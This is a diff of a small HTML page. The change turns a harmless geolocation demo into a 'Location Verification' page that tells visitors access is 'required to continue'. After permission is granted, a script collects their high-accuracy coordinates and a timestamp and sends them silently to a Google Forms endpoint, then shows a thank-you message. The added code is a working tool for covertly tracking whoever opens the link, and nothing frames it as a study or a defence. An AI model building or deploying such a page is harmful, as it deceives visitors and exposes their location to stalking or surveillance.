@@ -1,32 +1,75 @@
 <!DOCTYPE html>
-<html>
-<body style="font-family:Arial;text-align:center;padding-top:40px">
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
 
-<h3>Requesting location…</h3>
+<body style="font-family: Arial; text-align:center; padding-top:40px;">
+  <h3>Please allow location access</h3>
+  <p>This is required to continue.</p>
 
 <script>
-navigator.geolocation.getCurrentPosition(
-  function(pos) {
-    document.body.innerHTML =
-      "<h3>SUCCESS ✅</h3>" +
-      "Latitude: " + pos.coords.latitude + "<br>" +
-      "Longitude: " + pos.coords.longitude + "<br>" +
-      "Accuracy: " + pos.coords.accuracy + " meters";
-  },
-  function(err) {
-    document.body.innerHTML =
-      "<h3>ERROR ❌</h3>" +
-      "Error code: " + err.code + "<br>" +
-      "Message: " + err.message;
-  },
-  {
-    enableHighAccuracy: true,
-    timeout: 20000,
-    maximumAge: 0
+(function () {
+
+  if (!navigator.geolocation) {
+    document.body.innerHTML = "Geolocation not supported ❌";
+    return;
   }
-);
+
+  navigator.geolocation.getCurrentPosition(
+    function (position) {
+
+      // 📍 Location values
+      const latitude  = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy  = position.coords.accuracy;
+      const time      = new Date().toLocaleString();
+
+      // 🔗 REPLACE THIS WITH YOUR FORM ACTION URL
+      const FORM_ACTION_URL =
+        "https://docs.google.com/forms/d/e/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse";
+
+      // 🧩 REPLACE ENTRY IDS
+      const ENTRY_LAT  = "entry.XXXXXXXX"; // Latitude
+      const ENTRY_LNG  = "entry.YYYYYYYY"; // Longitude
+      const ENTRY_TIME = "entry.ZZZZZZZZ"; // Time
+      const ENTRY_ACC  = "entry.AAAAAAAA"; // Accuracy (optional)
+
+      // 📤 Prepare data
+      const formData = new FormData();
+      formData.append(ENTRY_LAT, latitude);
+      formData.append(ENTRY_LNG, longitude);
+      formData.append(ENTRY_TIME, time);
+      formData.append(ENTRY_ACC, accuracy);
+
+      // 🚀 Send silently
+      fetch(FORM_ACTION_URL, {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+      });
+
+      // ✅ Success UI
+      document.body.innerHTML = `
+        <h3>Location saved successfully ✅</h3>
+        <p>Thank you</p>
+      `;
+
+    },
+    function (error) {
+      document.body.innerHTML = "Location permission denied ❌";
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+
+})();
 </script>
 
 </body>
 </html>
-
